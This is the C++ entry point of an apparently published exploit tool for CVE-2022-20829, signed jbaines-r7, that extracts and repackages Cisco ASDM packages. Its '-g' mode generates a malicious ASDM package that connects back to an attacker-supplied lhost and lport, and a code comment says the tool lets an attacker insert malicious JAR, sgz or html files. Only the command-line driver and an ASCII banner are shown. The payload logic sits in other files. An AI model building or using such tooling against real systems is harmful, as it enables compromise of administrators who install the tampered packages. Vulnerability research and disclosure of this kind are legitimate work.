#include "popl.hpp"
#include "extract.hpp"
#include "repackage.hpp"
#include "generate.hpp"

#include <cstdlib>
#include <iostream>
/**
 * ASDM package files are roughly broken down into four parts:
 * 1. A header containing some string/compilation information
 * 2. An md5 hash
 * 3. A manifest of included files (see manifest_entry below)
 * 4. All the data of the files.
 *
 * The manifest has some really strange padding requirements that
 * make all of this really awful code look even worse than it already
 * is. Also, oddly, two manifest entries can point to the same data
 * block in part 4 (see asdm50-install.msi and dm_launcher.msi).
 * Also, generally speaking, files are written in alphabetical order
 * for reasons.
 *
 * This also currently shells out to execute the md5 logic. I couldn't
 * find a header-only md5 implementation and I didn't want to bother
 * with anything else. I'm sorry :(
 *
 * Otherwise! This script should be able to extract and repackage
 * arbitrary packages. That should allow an attacker to drop in
 * malicious JAR files, sgz, or html if that's your game.
 */
namespace
{
    void banner()
    {
        std::cout << std::endl;
        std::cout << "                         where were they going without ever knowing" << std::endl;
        std::cout << "           .              __.....__ " << std::endl;
        std::cout << "         .'|          .-''         '.                   _     _     .-.          .- " << std::endl;
        std::cout << "     .| <  |         /     .-''\"'-.  `.           /\\    \\\\   //      \\ \\        / /" << std::endl;
        std::cout << "   .' |_ | |        /     /________\\   \\          `\\\\  //\\\\ //  __    \\ \\      / /" << std::endl;
        std::cout << " .'     || | .'''-. |                  |            \\`//  \\'/.:--.'.   \\ \\    / /" << std::endl;
        std::cout << "'--.  .-'| |/.'''. \\\\    .-------------'             \\|   |// |   \\ |   \\ \\  / /" << std::endl;
        std::cout << "   |  |  |  /    | | \\    '-.____...---.              '     `\" __ | |    \\ `  /" << std::endl;
        std::cout << "   |  |  | |     | |  `.             .'                      .'.''| |     \\  /" << std::endl;
        std::cout << "   |  '.'| |     | |    `''-...... -'     jbaines-r7        / /   | |_    / /" << std::endl;
        std::cout << "   |   / | '.    | '.                   CVE-2022-20829      \\ \\._,\\ '/|`-' /" << std::endl;
        std::cout << "   `'-'  '---'   '---'                        🦞             `--'  `\"  '..'" << std::endl;
        std::cout << std::endl;
    }
}

int main(int p_argc, char** p_argv)
{
    banner();

    popl::OptionParser op("Allowed options");
    auto help_option = op.add<popl::Switch>("h", "help", "Produces this help message");
    auto asdm_file = op.add<popl::Value<std::string> >("i", "input", "The file to parse or directory to extract");
    auto lhost = op.add<popl::Value<std::string> >("", "lhost", "The host to connect back");
    auto lport = op.add<popl::Value<int> >("", "lport", "The port to connect back to");
    auto extract = op.add<popl::Switch>("e", "extract", "Extract the input");
    auto repackage = op.add<popl::Switch>("r", "repackage", "Repackage the input");
    auto generate = op.add<popl::Switch>("g", "generate", "Generates a malicious ASM package");

    try
    {
        op.parse(p_argc, p_argv);
    }
    catch (std::exception& e)
    {
        std::cout << e.what() << std::endl;
        std::cout << op << std::endl;
        return EXIT_FAILURE;
    }

    if (help_option->is_set())
    {
        std::cout << op << std::endl;
        return EXIT_SUCCESS;
    }

    if (extract->is_set())
    {
        //verify asdm file is set
        theway::do_extract(asdm_file->value());
    }
    else if (repackage->is_set())
    {
        // verify asdm file is set
        //todo asdm_file should end with '/'
        theway::do_repackage(asdm_file->value());
    }
    else if (generate->is_set())
    {
        if (lhost->is_set() && lport->is_set())
        {
            theway::do_generate(lhost->value(), lport->value());
        }
        else
        {
            std::cerr << "[!] Provide lhost and lport for -g" << std::endl;
        }
    }
    else
    {
        std::cerr << "[!] Please select -e, -r, or -g." << std::endl;
    }

    return EXIT_FAILURE;
}